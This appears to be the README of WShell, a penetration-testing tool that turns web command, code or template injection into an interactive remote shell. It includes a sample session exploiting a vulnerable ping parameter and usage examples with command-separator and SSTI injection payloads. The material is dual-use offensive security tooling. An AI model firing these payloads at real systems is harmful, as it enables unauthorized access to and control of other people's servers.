# WShell

[![Python 3](https://img.shields.io/badge/python-3-green.svg?style=for-the-badge&logo=python&logoColor=white)](https://docs.python.org/3/)
[![WShell License](https://img.shields.io/github/license/unlock-security/wshell?style=for-the-badge&label=License)](https://github.com/unlock-security/wshell?tab=GPL-3.0-1-ov-file#readme)
[![Made by Unlock Security](https://img.shields.io/badge/Made_by-Unlock_Security-blue.svg?style=for-the-badge)](https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell)

WShell lets you turn a web-based {code,command,template} injection in a full-featured shell with ease.

## How it works

WShell is a post-exploitation tool for web-based remote command execution (RCE) vulnerabilities.
It provides an agentless, language-agnostic, interactive pseudo-shell that feels like a real shell.
When you run a command, WShell wraps it in a HTTP request and parse the HTTP response to get you
only the command output.

It can automatically find out what is the underlying operating system (OS) and adjust the shell
prompt and other internal behavior accordingly.

Unlike a standard web shell, WShell can handle commands like `cd` and a persistent commands history.

To make it works, you just have to specify the vulnerable URL, the necessary headers, HTTP
parameters and where to put the command to execute.

As an example, to exploit a command injection in a vulnerable `ping` functionality you can do this:

```shell
attacker@host:/$ wshell --log=info 'https://www.target.com/app/vulnerable/ping.php?count=3' 'host=;WSHELL #'

[13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters
[13:37:00] [INFO] Target OS not specified, trying to automatically detect it
[13:37:00] [INFO] Target OS detected as Linux

www-data@app:/var/www/app/vulnerable$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@app:/var/www/app/vulnerable$ cd ../../
/var/www

www-data@app:/var/www/app/vulnerable$ ls -al
total 20
drwxrwx---  8 www-data www-data 4096 Mar  7 23:49 .
drwxr-xr-x 14 root     root     4096 Mar 18 13:37 ..
drwxrwx--- 25 www-data www-data 4096 Feb 18 15:31 app
```

## Install

```shell
pipx install git+https://git@github.com/unlock-security/wshell
```

## Development

```
git clone https://github.com/unlock-security/wshell
cd wshell/
python3 -m virtualenv .venv
source .venv/bin/activate
pip install -e .
```

## Usage

```
usage: wshell [-h] [-v] [--placeholder COMMAND_PLACEHOLDER] [--os {linux,win-cmd,win-psh}] [-m METHOD] [-t SECONDS] [--keep-alive] [--follow] [-ua USER_AGENT | -r] [-j | -f]
              [--log {critical,error,warning,info,debug}] [--list-scripts] [--input-scripts INPUT_SCRIPTS] [--output-scripts OUTPUT_SCRIPTS]
              URL [REQUEST ITEMS ...]

Turn a web-based {code,command,template} injection in a full featured shell with ease

positional arguments:
  URL                   The endpoint URL where the injection is
  REQUEST ITEMS         POST data and headers ('key=value' for data, 'key:value' for headers)

options:
  -h, --help            show this help message and exit
  -v, --version         Show the version number and exit
  --placeholder COMMAND_PLACEHOLDER
                        Use a custom command placeholder (default: WSHELL)
  --os {linux,win-cmd,win-psh}
                        Specify OS and shell in use on the target (default: auto-discover)

HTTP arguments:
  -m, --method METHOD   The HTTP method to be used for the requests (Default: POST if there is some data, GET otherwise)
  -t, --timeout SECONDS
                        The connection timeout of the request in seconds (default: 3.0)
  --keep-alive          Use persistent connection (default: True)
  --follow              Follow 30x Location redirects (default: True)
  -ua, --user-agent USER_AGENT
                        Use a custom User-Agent (default: WShell v0.1.0)
  -r, --random-agent    Use a random valid browser User-Agent
  -j, --json            Data items from the command line are serialized as a JSON object (default: False)
  -f, --form            Data items from the command line are serialized as form fields

Logging arguments:
  --log {critical,error,warning,info,debug}
                        To specify the log messages level

Input/Output scripts:
  --list-scripts        List the available scripts to manipulate input/output
  --input-scripts INPUT_SCRIPTS
                        Use one or more custom input script (comma separated, order matters)
  --output-scripts OUTPUT_SCRIPTS
                        Use one or more custom output script (comma separated, order matters)

For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT

Example usage:

    wshell 'https://www.example.com/webshell?cmd=WSHELL'
    wshell --form 'https://www.example.com/command-injection' 'p=;WSHELL #'
    wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("WSHELL")}'
```

## License

Released under [GPL LICENSE](https://github.com/unlock-security/wshell/blob/main/LICENSE) by [🔓 Unlock Security](https://www.unlock-security.it/).
